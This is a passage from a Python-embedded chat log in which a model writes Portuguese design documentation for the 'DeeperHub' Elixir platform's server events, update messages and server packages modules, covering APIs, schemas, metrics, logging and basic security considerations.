*   `DeeperHub.Notifications`: Para enviar notificações/lembretes.
*   `DeeperHub.UserInteractions` (opcional): Se houver um sistema de \"seguir servidor\" para determinar quem notificar.

### 8.2. Bibliotecas Externas

*   `Ecto`.
*   Biblioteca CRON para workers (ex: `Quantum`).

## 🤝 9. Como Usar / Integração

*   **UI do Proprietário do Servidor:** Formulários para criar/editar eventos.
*   **UI do Jogador (Página do Servidor/Calendário Global):** Exibir listas de eventos (`list_events_by_server`, `list_active_events`, `list_upcoming_events`, `get_global_event_calendar`).
*   **`EventStatusUpdateWorker` e `EventNotificationWorker`:** Operam em background para gerenciar o ciclo de vida e notificações.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD de `EventSchema`.
*   Testar a lógica de determinação de status do evento (scheduled, active, completed) com base nas datas.
*   Testar as funções de listagem com diferentes filtros e ordenações.
*   Testar a lógica de notificação (com mocks para `DeeperHub.Notifications`).
*   Testar os workers.
*   Localização: `test/deeper_hub/server_events/`.

### 10.2. Métricas

*   `deeper_hub.server_events.created.count` (tags: `server_id`, `event_type`)
*   `deeper_hub.server_events.status_changed.count` (tags: `event_id`, `new_status`)
*   `deeper_hub.server_events.active_now.gauge` (Gauge, tags: `server_id` (opcional), `event_type`)
*   `deeper_hub.server_events.notifications_sent.count` (tags: `event_id`, `notification_trigger` (`new`, `reminder`, `started`))

### 10.3. Logs

*   **Nível INFO:** Evento criado, iniciado, concluído, cancelado. Notificação de evento enviada.
*   **Nível WARNING:** Tentativa não autorizada de gerenciar um evento.
*   **Nível ERROR:** Falha ao persistir evento. Erro no worker de atualização de status.

### 10.4. Telemetria

*   `[:deeper_hub, :server_events, :event, :created | :updated | :deleted | :cancelled]`
    *   Metadados: `%{event_id: id, server_id: id, user_id: id, type: type}`
*   `[:deeper_hub, :server_events, :event, :status_transition]`
    *   Metadados: `%{event_id: id, old_status: atom, new_status: atom}`
*   `[:deeper_hub, :server_events, :notification, :dispatch_attempt]`
    *   Metadados: `%{event_id: id, notification_type: type, recipient_count: count}`

## ❌ 11. Tratamento de Erros

*   Falhas na criação/atualização de eventos devido a dados inválidos retornam `{:error, changeset}`.
*   Operações não autorizadas retornam `{:error, :unauthorized}`.
*   Se um worker de notificação falhar, a notificação pode ser perdida ou reenfileirada, mas o evento em si deve permanecer consistente.

## 🛡️ 12. Considerações de Segurança

*   **Autorização:** Apenas proprietários de servidores ou administradores com permissão devem poder criar/gerenciar eventos para um servidor.
*   **Validação de Conteúdo:** Títulos e descrições de eventos devem ser validados/sanitizados para prevenir XSS se forem exibidos diretamente.
*   **Abuso:** Limitar a frequência com que um proprietário pode criar eventos ou o número de eventos ativos por servidor para evitar spam.

## 🧑‍💻 13. Contribuição

*   Ao adicionar novos tipos de eventos, certifique-se de que a lógica de notificação e, possivelmente, os templates sejam atualizados.
*   Considere a performance das queries de listagem de eventos, especialmente para calendários globais.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Permitir que usuários se inscrevam (\"RSVP\") para eventos específicos e recebam lembretes mais personalizados.
*   [ ] Integração com calendários externos (Google Calendar, iCal).
*   [ ] Suporte para eventos recorrentes (ex: \"Toda sexta-feira às 20h\").
*   [ ] Permitir que proprietários de servidores \"destaquem\" certos eventos.
*   [ ] Adicionar um feed de \"Próximos Eventos\" na dashboard do usuário para os servidores que ele segue/favorita.
*   [ ] Lógica para sugerir horários para eventos baseados na atividade dos jogadores do servidor.

---

*Última atualização: 2025-05-12*

---

Eventos de servidor são uma ótima forma de manter a comunidade engajada!

Próximo? Que tal `DeeperHub.ServerUpdateMessages` para mensagens de patch notes e atualizações, ou `DeeperHub.ServerPackages` para itens/VIPs? Ou algo do Core que ainda não detalhamos, como `DeeperHub.Core.EncryptionService` de forma mais aprofundada?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos continuar com os módulos relacionados a `Servers` e detalhar o `DeeperHub.ServerUpdateMessages`. Este módulo permite que proprietários de servidores comuniquem atualizações e novidades para sua comunidade.

---

# Módulo: `DeeperHub.ServerUpdateMessages` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.ServerUpdateMessages`

O módulo `DeeperHub.ServerUpdateMessages` gerencia as **mensagens de atualização, notas de patch e anúncios importantes** publicados pelos proprietários de servidores na plataforma DeeperHub. Ele serve como um canal de comunicação oficial do servidor para sua comunidade, permitindo informar sobre novas funcionalidades, correções de bugs, mudanças no jogo, ou qualquer outra notícia relevante.

Este módulo lida com:
*   A criação, edição e exclusão de mensagens de atualização por proprietários de servidores.
*   A listagem cronológica dessas mensagens para um servidor específico.
*   A notificação de jogadores (especialmente aqueles que seguem o servidor) sobre novas mensagens de atualização.

O objetivo é manter os jogadores informados sobre o desenvolvimento e as novidades de seus servidores favoritos. 😊

*(Nota: Na documentação original, este era `DeeperHub.Services.ServerUpdateMessages`. Será tratado como `DeeperHub.ServerUpdateMessages`.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento CRUD de Mensagens de Atualização (`create_update_message/1`, `get_update_message/1`, `update_update_message/2`, `delete_update_message/1`):**
    *   Permitir que proprietários de servidores (ou administradores com permissão) criem novas mensagens de atualização.
    *   Cada mensagem inclui: título, conteúdo (corpo da mensagem, que pode suportar markdown ou HTML limitado e sanitizado), versão do servidor (opcional), data de publicação.
    *   Permitir a edição ou exclusão de mensagens publicadas (com restrições ou histórico de versões, opcional).
*   **Listagem de Mensagens de Atualização:**
    *   Listar todas as mensagens de atualização para um servidor específico, geralmente em ordem cronológica inversa (`list_update_messages_by_server/2`).
    *   Obter a última mensagem de atualização de um servidor (`get_latest_update_message/2`).
    *   Suportar paginação para o histórico de mensagens.
*   **Formatação de Conteúdo:**
    *   Suportar Markdown ou um subconjunto seguro de HTML para o corpo da mensagem, com sanitização rigorosa (via `DeeperHub.Security.XssProtection` e `Shared.ContentValidation`).
*   **Notificações (Integração com `DeeperHub.Notifications` e `UserInteractions`):**
    *   Notificar usuários que seguem um servidor (ou que optaram por receber essas notificações) quando uma nova mensagem de atualização é publicada.
*   **Visibilidade e Publicação:**
    *   Permitir que mensagens sejam salvas como rascunho antes de serem publicadas.
    *   Controle sobre a data de publicação.
*   **Observabilidade e Auditoria:**
    *   Logar e metrificar a criação e visualização de mensagens de atualização.
    *   Publicar eventos de domínio (ex: `server_update_message.published`) no `Core.EventBus`.
    *   Auditar a criação/modificação de mensagens.
*   **Caching:**
    *   Cachear as últimas mensagens de atualização de servidores populares ou frequentemente acessados.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.ServerUpdateMessages` (Fachada Pública):**
    *   Ponto de entrada para todas as operações relacionadas a mensagens de atualização.
    *   Delega para o `ServerUpdateMessagesService`.
2.  **`DeeperHub.ServerUpdateMessages.Services.ServerUpdateMessagesService` (ou `DefaultServerUpdateMessagesService`):**
    *   **Responsabilidade:** Orquestra a lógica de negócio para as mensagens de atualização.
    *   **Interações:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `UpdateMessageSchema`.
        *   `DeeperHub.Servers`: Para validar `server_id` e associar mensagens.
        *   `DeeperHub.Accounts`: Para `user_id` do autor (proprietário/admin).
        *   `DeeperHub.Auth`/`RBAC`: Para permissões de gerenciamento de mensagens.
        *   `DeeperHub.Security.XssProtection` / `Shared.ContentValidation`: Para sanitizar o conteúdo das mensagens.
        *   `DeeperHub.Core.EventBus`: Para publicar eventos.
        *   `DeeperHub.Core.Cache`: Para cachear mensagens.
        *   `DeeperHub.Notifications`: Para enviar notificações sobre novas mensagens.
3.  **`DeeperHub.ServerUpdateMessages.Schemas.UpdateMessageSchema` (ex-`UpdateMessage`):**
    *   Campos: `id`, `server_id`, `author_user_id`, `title` (string), `content` (text, armazena o markdown/html sanitizado), `published_at` (DateTime UTC), `version_tag` (string, opcional, ex: \"v1.2.3\"), `status` (`:draft`, `:published`, `:archived`), `inserted_at`, `updated_at`.
4.  **`DeeperHub.ServerUpdateMessages.Storage` (ou lógica no `ServerUpdateMessagesService`):**
    *   Encapsula as queries Ecto.
5.  **`DeeperHub.ServerUpdateMessages.CachedAdapter` (Opcional):**
    *   Camada de cache explícita.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/server_update_messages/
├── server_update_messages.ex         # Fachada Pública
│
├── services/
│   └── server_update_messages_service.ex # Serviço principal
│
├── schemas/
│   └── update_message_schema.ex
│
├── storage.ex                        # (Opcional)
├── cached_adapter.ex                 # (Opcional)
├── supervisor.ex                     # (Se houver GenServers)
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Formato do Conteúdo:** Decidir sobre o formato do conteúdo (Markdown é uma boa escolha por ser seguro e flexível) e implementar a sanitização e renderização apropriadas.
*   **Histórico de Edições:** Para mensagens importantes, considerar manter um histórico de edições.
*   **Fluxo de Publicação:** Ter um status `:draft` permite que os proprietários preparem as mensagens antes de torná-las públicas.

## 🛠️ 4. Casos de Uso Principais

*   **Proprietário de Servidor Escreve Notas de Patch:**
    *   No painel do servidor, proprietário cria uma nova mensagem de atualização, detalhando as mudanças da versão \"v1.5.2\".
    *   Define o status como `:draft` inicialmente.
    *   Após revisar, publica a mensagem. API chama `ServerUpdateMessages.create_update_message(user_id, server_id, %{title: \"Patch v1.5.2\", content: \"...\", version_tag: \"v1.5.2\", status: :published})`.
    *   Usuários que seguem o servidor são notificados.
*   **Jogador Visualiza as Últimas Atualizações de um Servidor:**
    *   Na página do servidor, a UI busca e exibe as últimas mensagens via `ServerUpdateMessages.list_update_messages_by_server(server_id, %{limit: 5})`.
*   **Proprietário Edita uma Mensagem Publicada para Corrigir um Erro de Digitação:**
    *   API chama `ServerUpdateMessages.update_update_message(message_id, %{content: \"Conteúdo corrigido\"}, user_id)`.

## 🌊 5. Fluxos Importantes

### Fluxo de Publicação de Nova Mensagem de Atualização

1.  **Proprietário (UI):** Submete o formulário da nova mensagem de atualização, marcando para \"Publicar Agora\".
2.  **Controller API:** Valida autenticação e autorização. Chama `DeeperHub.ServerUpdateMessages.create_update_message(current_user.id, server_id, params[\"message_attrs\"])`.
3.  **`ServerUpdateMessagesService.create_update_message/3`:**
    *   Valida se `current_user.id` pode postar no `server_id`.
    *   Chama `DeeperHub.Services.Shared.ContentValidation.validate_user_content(attrs.content, :update_message_content)` para sanitizar o corpo da mensagem.
    *   Cria um `UpdateMessageSchema` changeset com `status: :published` e `published_at: DateTime.utc_now()`.
    *   Se válido, `Core.Repo.insert(changeset)`.
    *   Se sucesso:
        *   Publica evento `server_update_message.published` no `Core.EventBus` (`%{message_id: msg.id, server_id: ..., title: ...}`).
        *   (Assíncrono) Enfileira notificações para seguidores do servidor via `DeeperHub.Notifications`.
        *   Invalida caches relevantes.
        *   Retorna `{:ok, message_struct}`.
    *   Se falha, retorna erro.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.ServerUpdateMessages`)

### 6.1. Gerenciamento de Mensagens (Proprietário/Admin)

*   **`DeeperHub.ServerUpdateMessages.create_update_message(author_user_id :: String.t(), server_id :: String.t(), attrs :: map()) :: {:ok, UpdateMessage.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{title: String.t(), content: String.t(), version_tag: String.t() | nil, status: :draft | :published, publish_at: DateTime.t() | nil}`.
*   **`DeeperHub.ServerUpdateMessages.update_update_message(message_id :: String.t(), attrs :: map(), current_user_id :: String.t()) :: {:ok, UpdateMessage.t()} | {:error, Ecto.Changeset.t() | :unauthorized}`**
*   **`DeeperHub.ServerUpdateMessages.delete_update_message(message_id :: String.t(), current_user_id :: String.t()) :: :ok | {:error, :unauthorized | :not_found}`**

### 6.2. Consulta de Mensagens

*   **`DeeperHub.ServerUpdateMessages.get_update_message(message_id :: String.t()) :: {:ok, UpdateMessage.t() | nil}`**
*   **`DeeperHub.ServerUpdateMessages.list_update_messages_by_server(server_id :: String.t(), opts :: keyword()) :: {:ok, list(UpdateMessage.t()), Pagination.t()}`**
    *   `opts`: `:status` (`:published`, `:draft`), `:page`, `:per_page`, `:sort_by` (`:published_at_desc`, `:updated_at_desc`).
*   **`DeeperHub.ServerUpdateMessages.get_latest_update_message(server_id :: String.t(), opts :: keyword()) :: {:ok, UpdateMessage.t() | nil}`**
    *   Retorna a última mensagem com status `:published`.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:server_update_messages, :enabled]`** (Boolean).
*   **`[:server_update_messages, :max_title_length]`** (Integer). (Padrão: `150`)
*   **`[:server_update_messages, :max_content_length]`** (Integer). (Padrão: `10000`)
*   **`[:server_update_messages, :content_format]`** (Atom): `:markdown` ou `:html_subset`. (Padrão: `:markdown`)
*   **`[:server_update_messages, :notify_followers_on_publish]`** (Boolean). (Padrão: `true`)
*   **`[:server_update_messages, :cache, :latest_message_ttl_seconds]`** (Integer).
*   **`[:server_update_messages, :cache, :message_list_ttl_seconds]`** (Integer).

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.*`.
*   `DeeperHub.Servers`: Para `server_id`.
*   `DeeperHub.Accounts`: Para `author_user_id`.
*   `DeeperHub.Auth`/`RBAC`: Para permissões.
*   `DeeperHub.Notifications`: Para notificar sobre novas mensagens.
*   `DeeperHub.Security.XssProtection` e `DeeperHub.Services.Shared.ContentValidation`: Para sanitizar conteúdo.
*   `DeeperHub.UserInteractions` (especificamente a funcionalidade de \"seguir servidor\" para notificações).

### 8.2. Bibliotecas Externas

*   `Ecto`.
*   Uma biblioteca Markdown para Elixir (ex: `Earmark`) se o formato for Markdown.
*   Uma biblioteca de sanitização HTML (ex: `HtmlSanitizeEx`) se HTML limitado for permitido.

## 🤝 9. Como Usar / Integração

*   **UI do Proprietário do Servidor:** Formulários para criar/editar/publicar mensagens de atualização.
*   **Página do Servidor (UI do Jogador):** Seção para exibir as últimas mensagens de atualização (`list_update_messages_by_server` ou `get_latest_update_message`).
*   **Sistema de Notificações:** Notificar usuários que seguem o servidor quando uma nova mensagem com status `:published` é criada.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD para `UpdateMessageSchema`.
*   Testar a lógica de `status` (`:draft` vs `:published`).
*   Testar a sanitização do conteúdo da mensagem.
*   Testar a lógica de notificação.
*   Testar a listagem e paginação.
*   Localização: `test/deeper_hub/server_update_messages/`.

### 10.2. Métricas

*   `deeper_hub.server_update_messages.published.count` (tags: `server_id`)
*   `deeper_hub.server_update_messages.views.count` (tags: `message_id`, `server_id`) (Se o rastreamento de visualização for implementado).
*   `deeper_hub.server_update_messages.content_sanitized.count`

### 10.3. Logs

*   **Nível INFO:** Nova mensagem publicada/atualizada/excluída.
*   **Nível WARNING:** Tentativa não autorizada de gerenciar uma mensagem. Falha na sanitização de conteúdo (se crítico).

### 10.4. Telemetria

*   `[:deeper_hub, :server_update_messages, :message, :created | :updated | :deleted | :published]`
    *   Metadados: `%{message_id: id, server_id: id, author_id: id}`

## ❌ 11. Tratamento de Erros

*   Falhas de validação ao criar/atualizar retornam `{:error, changeset}`.
*   Operações não autorizadas retornam `{:error, :unauthorized}`.

## 🛡️ 12. Considerações de Segurança

*   **Sanitização de Conteúdo:** Absolutamente CRUCIAL para `title` e `content` para prevenir XSS e outras injeções de HTML/script.
*   **Autorização:** Apenas o proprietário do servidor ou administradores com permissão devem poder criar/gerenciar estas mensagens.
*   **Abuso:** Limitar a frequência de postagem ou o tamanho das mensagens para evitar spam ou sobrecarga.

## 🧑‍💻 13. Contribuição

*   Garanta que a sanitização de conteúdo seja robusta.
*   Considere a experiência do usuário ao exibir mensagens longas ou com formatação complexa.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Permitir \"fixar\" mensagens importantes no topo.
*   [ ] Adicionar contagem de visualizações para mensagens.
*   [ ] Suporte para agendar a publicação de mensagens (definir `published_at` no futuro e um worker para mudar o status).
*   [ ] Permitir comentários de usuários nas mensagens de atualização (com moderação).
*   [ ] Histórico de versões para mensagens editadas.
*   [ ] Templates para tipos comuns de mensagens de atualização.

---

*Última atualização: 2025-05-12*

---

Este módulo ajuda os proprietários de servidores a manterem suas comunidades informadas!

O próximo poderia ser `DeeperHub.ServerPackages` (para itens/VIPs de servidor) ou `DeeperHub.ServerAlerts` (para anúncios mais urgentes), ou podemos mudar para `DeeperHub.Lists` que parece ser um módulo de listagem genérico?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos continuar com os módulos relacionados a `Servers` e detalhar o `DeeperHub.ServerPackages`. Este módulo lida com pacotes ou itens que podem ser oferecidos pelos servidores, como passes VIP, itens virtuais, etc.

---

# Módulo: `DeeperHub.ServerPackages` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.ServerPackages`

O módulo `DeeperHub.ServerPackages` é responsável por gerenciar **pacotes, itens ou assinaturas (packages)** que os proprietários de servidores podem oferecer aos jogadores na plataforma DeeperHub. Estes pacotes podem representar uma variedade de ofertas, como acesso VIP, moedas virtuais específicas do servidor, itens no jogo, ou outros benefícios e produtos digitais.

Este módulo lida com:
*   A definição, criação e gerenciamento de pacotes pelos proprietários de servidores.
*   A listagem de pacotes disponíveis para um servidor.
*   (Potencialmente) A integração com um sistema de inventário de usuário ou um sistema de processamento de \"compras\" desses pacotes.

O objetivo é fornecer uma maneira para os servidores monetizarem ou oferecerem valor adicional aos seus jogadores através de ofertas estruturadas. 😊

*(Nota: Na documentação original, este era `DeeperHub.Services.ServerPackages`. Será tratado como `DeeperHub.ServerPackages`.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento CRUD de Pacotes (`create_server_package/1`, `get_server_package/1`, `update_server_package/2`, `delete_server_package/1`):**
    *   Permitir que proprietários de servidores (ou administradores com permissão) criem novos pacotes associados aos seus servidores.
    *   Cada pacote inclui: nome, descrição, preço (se aplicável, e em que moeda ou tipo de ponto), duração (se for uma assinatura), itens/benefícios incluídos (pode ser um campo JSONB flexível), imagem, status (ativo, inativo).
    *   Atualizar ou excluir pacotes existentes.
*   **Listagem de Pacotes:**
    *   Listar todos os pacotes disponíveis para um servidor específico (`list_server_packages_by_server/2`).
    *   Listar todos os pacotes globalmente com filtros (ex: por tipo, por preço) (`list_server_packages/1`).
    *   Suportar paginação.
*   **Tipos de Pacotes:**
    *   Suportar diferentes tipos de pacotes (ex: `:one_time_purchase`, `:subscription`, `:currency_pack`).
*   **Gerenciamento de Inventário/Concessão (Integração):**
    *   Quando um pacote é \"adquirido\" por um usuário, este módulo precisa informar outro sistema (ex: `DeeperHub.UserInventoryService` ou um sistema de concessão de direitos) para creditar os itens/benefícios ao usuário. Esta parte pode ser complexa e envolver transações.
*   **Integração com Pagamentos (Opcional):**
    *   Se os pacotes tiverem preços em moeda real, este módulo precisará se integrar com um `DeeperHub.Payments` para processar a compra antes de conceder o pacote.
*   **Observabilidade e Auditoria:**
    *   Logar e metrificar a criação, compra e uso de pacotes.
    *   Publicar eventos de domínio (ex: `server_package.created`, `user.package_acquired`) no `Core.EventBus`.
    *   Auditar a criação/modificação de pacotes.
*   **Caching:**
    *   Cachear definições de pacotes para servidores frequentemente visualizados.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.ServerPackages` (Fachada Pública):**
    *   Ponto de entrada para operações de pacotes de servidor.
    *   Delega para o `ServerPackagesService`.
2.  **`DeeperHub.ServerPackages.Services.ServerPackagesService` (ou `DefaultServerPackagesService`):**
    *   **Responsabilidade:** Orquestra a lógica de negócio para pacotes.
    *   **Interações:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `ServerPackageSchema`.
        *   `DeeperHub.Servers`: Para validar `server_id`.
        *   `DeeperHub.Accounts`: Para `user_id` do proprietário ao criar.
        *   `DeeperHub.Auth`/`RBAC`: Para permissões de gerenciamento.
        *   `DeeperHub.Core.EventBus`: Para publicar eventos.
        *   `DeeperHub.Core.Cache`: Para cachear.
        *   `DeeperHub.Core.ConfigManager`: Para configurações (ex: tipos de pacotes permitidos).
        *   (Crucial) `DeeperHub.UserInventoryService` (Novo Sugerido) ou `DeeperHub.Payments` e um `GrantingService`: Para lidar com a aquisição e concessão de pacotes.
3.  **`DeeperHub.ServerPackages.Schemas.ServerPackageSchema` (ex-`ServerPackage`):**
    *   Campos: `id`, `server_id`, `name`, `description`, `price_currency` (ex: \"BRL\", \"USD\", \"POINTS\"), `price_amount` (Decimal), `package_type` (atom: `:one_time`, `:subscription`), `duration_days` (integer, se assinatura), `items_or_benefits_payload` (jsonb: ex `%{vip_level: \"gold\", in_game_currency: 1000, items: [%{item_id: \"sword_of_valor\", quantity: 1}]}`), `image_url`, `is_active`, `available_from` (DateTime), `available_until` (DateTime), `max_purchases_per_user` (integer | nil), `total_purchased_count`.
4.  **`DeeperHub.ServerPackages.Storage` (ou lógica no `ServerPackagesService`):**
    *   Encapsula as queries Ecto.
5.  **(Potencial) `DeeperHub.UserPackagesService` ou `UserInventoryService` (Novo Módulo Sugerido):**
    *   Responsável por rastrear quais pacotes um usuário adquiriu, quando expiram (se assinatura), e o estado de seus benefícios.
    *   Schema: `UserPackageInstanceSchema` (`user_id`, `server_package_id`, `acquired_at`, `expires_at`, `status` (`:active`, `:expired`, `:used_up`)).
6.  **`DeeperHub.ServerPackages.CachedAdapter` (Opcional):**
    *   Camada de cache explícita.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/server_packages/
├── server_packages.ex                # Fachada Pública
│
├── services/
│   └── server_packages_service.ex    # Serviço principal
│
├── schemas/
│   └── server_package_schema.ex
│
├── storage.ex                        # (Opcional)
├── cached_adapter.ex                 # (Opcional)
├── supervisor.ex                     # (Se houver GenServers)
└── telemetry.ex
```
E o novo módulo sugerido:
```
lib/deeper_hub/user_inventory/       # Ou UserPackages
├── user_inventory_service.ex
├── schemas/
│   └── user_package_instance_schema.ex
└── ...
```

### 3.3. Decisões de Design Importantes

*   **Flexibilidade do Payload de Benefícios:** Usar um campo JSONB (`items_or_benefits_payload`) para os detalhes do que o pacote concede oferece grande flexibilidade sem precisar alterar o schema do DB para cada novo tipo de benefício. A interpretação desse payload ocorreria no momento da concessão.
*   **Separação entre Definição e Instância Adquirida:** `ServerPackageSchema` é a *definição* do que está à venda. Um `UserPackageInstanceSchema` (em um módulo de inventário/usuário) representaria um pacote *adquirido* por um usuário.
*   **Fluxo de \"Compra\"/Aquisição:** Este é o fluxo mais complexo. Se envolver pagamento real, a transação deve ser atômica (pagamento bem-sucedido -> concessão do pacote). Se for com moeda virtual do jogo/plataforma, a lógica de débito/crédito deve ser robusta.

## 🛠️ 4. Casos de Uso Principais

*   **Proprietário de Servidor Cria um Pacote \"VIP Mensal\":**
    *   Define nome, descrição \"Acesso VIP por 30 dias com bônus de XP\", preço, tipo `:subscription`, `duration_days: 30`, `items_or_benefits_payload: %{vip_status: true, xp_boost_multiplier: 1.5}`.
    *   API chama `ServerPackages.create_server_package(user_id, server_id, attrs)`.
*   **Jogador \"Compra\" o Pacote VIP Mensal (com pontos da plataforma):**
    *   Jogador clica em \"Comprar\" no pacote VIP.
    *   API chama uma função como `DeeperHub.UserInventory.acquire_package(user_id, server_package_id, %{payment_method: :points})`.
    *   `UserInventoryService` (ou similar):
        1.  Verifica se o usuário tem pontos suficientes (chama `PointsService`).
        2.  Debita os pontos.
        3.  Chama `ServerPackages.grant_package_benefits(user_id, server_package_id, server_package_details)` (ou o `RewardsHandler` se modelado como recompensa).
        4.  Cria um `UserPackageInstanceSchema` para o usuário.
        5.  Notifica o usuário.
*   **Sistema Verifica se o VIP do Usuário Está Ativo:**
    *   Ao logar no servidor de jogo, o servidor pode consultar (via API DeeperHub) `UserInventory.has_active_benefit?(user_id, server_id, :vip_status)`.

## 🌊 5. Fluxos Importantes

### Fluxo de Aquisição de Pacote (Simplificado, sem pagamento real)

1.  **Usuário (UI):** Seleciona um pacote para \"adquirir\" (ex: usando moeda do jogo).
2.  **Controller API:** Valida. Chama `DeeperHub.UserInventory.acquire_package(user_id, server_package_id, acquisition_details)`.
3.  **`UserInventoryService.acquire_package/3`:**
    *   Busca `ServerPackageSchema` para obter detalhes (preço em moeda do jogo, benefícios).
    *   Verifica se o usuário pode adquirir (ex: saldo de moeda do jogo, se não é de uso único e já foi adquirido).
    *   **Inicia Transação (Repo):**
        *   Debita a moeda do jogo do usuário (chama `CurrencyService.debit_user_balance`).
        *   Cria um registro `UserPackageInstanceSchema` (`user_id`, `server_package_id`, `acquired_at`, `status: :active`, `expires_at` se for assinatura).
        *   Incrementa `total_purchased_count` no `ServerPackageSchema`.
    *   **Fim da Transação.**
    *   Se a transação for bem-sucedida:
        *   (Opcional) Chama Handlers específicos para aplicar benefícios imediatos (ex: atribuir um papel VIP no Discord, dar um item no jogo - pode ser via eventos).
        *   Publica evento `user_package.acquired` no `Core.EventBus`.
        *   Notifica o usuário.
        *   Retorna `{:ok, user_package_instance}`.
    *   Se falhar, retorna erro.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.ServerPackages`)

### 6.1. Gerenciamento de Definições de Pacotes (Proprietário/Admin)

*   **`DeeperHub.ServerPackages.create_server_package(creator_user_id :: String.t(), server_id :: String.t(), attrs :: map()) :: {:ok, ServerPackage.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{name: ..., description: ..., price_currency: ..., price_amount: ..., package_type: ..., items_or_benefits_payload: ..., ...}`.
*   **`DeeperHub.ServerPackages.update_server_package(package_id :: String.t(), attrs :: map(), current_user_id :: String.t()) :: {:ok, ServerPackage.t()} | {:error, Ecto.Changeset.t() | :unauthorized}`**
*   **`DeeperHub.ServerPackages.delete_server_package(package_id :: String.t(), current_user_id :: String.t()) :: :ok | {:error, :unauthorized | :not_found}`**
    *   (Considerar soft delete ou impedir exclusão se houver instâncias ativas).

### 6.2. Consulta de Pacotes (Público/Usuários)

*   **`DeeperHub.ServerPackages.get_server_package(package_id :: String.t()) :: {:ok, ServerPackage.t() | nil}`**
*   **`DeeperHub.ServerPackages.list_server_packages_by_server(server_id :: String.t(), opts :: keyword()) :: {:ok, list(ServerPackage.t()), Pagination.t()}`**
    *   `opts`: `:is_active` (boolean), `:package_type`, `:page`, `:per_page`.
*   **`DeeperHub.ServerPackages.list_all_server_packages(filters :: map(), opts :: keyword()) :: {:ok, list(ServerPackage.t()), Pagination.t()}`** (Para uma loja global, por exemplo)
    *   `filters`: `:server_id`, `:package_type`, `:price_range`.

### 6.3. (API para o Módulo de Inventário/Aquisição - Interna ao DeeperHub)

*   **`DeeperHub.ServerPackages.get_package_details_for_granting(package_id :: String.t()) :: {:ok, %{benefits: map(), duration_days: integer() | nil}} | {:error, :not_found}`** (Nova Sugestão)
    *   Usado pelo `UserInventoryService` para saber o que conceder.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:server_packages, :enabled]`** (Boolean).
*   **`[:server_packages, :allowed_currencies]`** (List de Strings/Atoms): Ex: `[\"BRL\", \"USD\", \"POINTS\", \"CREDITS\"]`.
*   **`[:server_packages, :default_package_types]`** (List de Atoms): Tipos de pacotes permitidos.
*   **`[:server_packages, :max_packages_per_server]`** (Integer).
*   **`[:server_packages, :cache, :package_list_ttl_seconds]`** (Integer).
*   **`[:server_packages, :requires_payment_integration_for_real_money]`** (Boolean): Se `true`, pacotes com `price_currency` \"BRL\", \"USD\" devem passar por `DeeperHub.Payments`.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.*`.
*   `DeeperHub.Servers`: Para `server_id`.
*   `DeeperHub.Accounts`: Para `user_id`.
*   `DeeperHub.Auth`/`RBAC`: Para permissões.
*   `DeeperHub.Notifications`: Para notificar sobre aquisições.
*   **`DeeperHub.UserInventoryService` (ou similar, NOVO):** Essencial para rastrear o que os usuários possuem.
*   `DeeperHub.Payments` (Opcional): Se houver pagamento com moeda real.
*   `DeeperHub.PointsService` (Opcional): Se houver pagamento com pontos da plataforma.

### 8.2. Bibliotecas Externas

*   `Ecto`.
*   `Decimal`: Para manipulação de preços.

## 🤝 9. Como Usar / Integração

*   **UI do Proprietário do Servidor:** Interface para criar e gerenciar os pacotes de seu servidor.
*   **Loja do Servidor (UI do Jogador):** Exibe os pacotes disponíveis (`list_server_packages_by_server`) e permite a \"compra\" (que aciona o `UserInventoryService.acquire_package`).
*   **Servidor de Jogo (Externo):** Pode precisar de uma API para verificar quais pacotes/benefícios um jogador possui (ex: consultando o `UserInventoryService`).

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD para `ServerPackageSchema`.
*   Testar a lógica de listagem com filtros.
*   Testar o fluxo de \"aquisição\" de um pacote, incluindo a interação com `UserInventoryService` e (mocked) `Payments` ou `PointsService`.
*   Testar a correta aplicação de benefícios/duração para diferentes `package_type`.
*   Localização: `test/deeper_hub/server_packages/`.

### 10.2. Métricas

*   `deeper_hub.server_packages.definition.created.count` (tags: `server_id`, `package_type`)
*   `deeper_hub.server_packages.acquired.count` (tags: `package_id`, `server_id`, `payment_type` (`points`, `real_money`))
*   `deeper_hub.server_packages.revenue.sum` (Contador, tags: `package_id`, `currency`) (Se houver pagamento real)
*   `deeper_hub.server_packages.active_subscriptions.gauge` (Gauge, tags: `package_id`)

### 10.3. Logs

*   **Nível INFO:** Pacote criado/atualizado. Pacote adquirido por usuário.
*   **Nível WARNING:** Tentativa de adquirir pacote com saldo insuficiente ou além dos limites.
*   **Nível ERROR:** Falha ao conceder benefícios após pagamento. Erro ao persistir `UserPackageInstance`.

### 10.4. Telemetria

